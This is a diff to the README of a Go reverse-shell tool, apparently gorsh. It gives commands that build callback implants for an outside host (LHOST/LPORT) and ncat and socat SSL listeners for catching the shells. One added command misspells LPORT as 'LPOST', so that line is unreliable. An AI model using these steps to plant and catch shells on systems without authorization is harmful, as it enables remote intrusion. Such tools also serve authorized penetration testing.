@@ -36,6 +36,8 @@ Roadmap:
 
 ## Getting started
 
+Make sure to read the Makefile. It gives you a good idea of what's going on.
+
 Check out the [official documentation](https://golang.org/doc/install) for an intro to developing
 with Go and setting up your Golang environment (with the `$GOPATH` environment variable).
 
@@ -47,7 +49,7 @@ First, you'll need to generate your certs:
 $ make depends
 ```
 
-To simplify things, read the provided Makefile. You can set the following environment variables:
+You can set the following environment variables to compile using `go build`:
 
 - `GOOS`: the target OS
 - `GOARCH`: the target architecture
@@ -62,22 +64,23 @@ Generate with:
 
 ```bash
 $ make {windows,macos,linux}{32,64} LHOST=example.com LPORT=443
+#or
+$ make all LHOST=example.com LPOST=443
 ```
 
 ## Catching the shell
 
-The `local/start.sh` kicks off a tmux session and creates new windows on every new connection.
-Feed it a port number to listen on and an `&` to send it to the background, if you'd like. 
+The `make listen` command kicks off a tmux session and creates new windows on every new connection.
+Feed it a port number as LPORT.
 
 ```sh
-cd local
-./start.sh 443 &
+make listen LPORT=8080
 
 # once a client connects
 tmux attach -t GORSH
 ```
 
-Shells can also be caught with:
+Shells can also be caught without tmux using:
 
 * socat (not working on macos)
 * ncat
@@ -91,11 +94,10 @@ $ ncat --ssl --ssl-cert server.pem --ssl-key server.key -lvp 1234
 $ socat stdio OPENSSL-LISTEN:443,cert=server.pem,key=server.key,verify=0
 ```
 
-Once executed, you will be provided with the gorsh shell.
+Once executed, you will be provided with the tool's shell.
 Type `help` to show what commands are supported.
 
 ## Credits
 
-Initial Work - Ronan Kervella `<r.kervella -at- sysdream -dot- com>`
-
-Modifications - f47h3r - [@f47h3r_b0](https://twitter.com/f47h3r_b0)
+* Initial Work - Ronan Kervella `<r.kervella -at- sysdream -dot- com>`
+* Modifications - f47h3r - [@f47h3r_b0](https://twitter.com/f47h3r_b0)
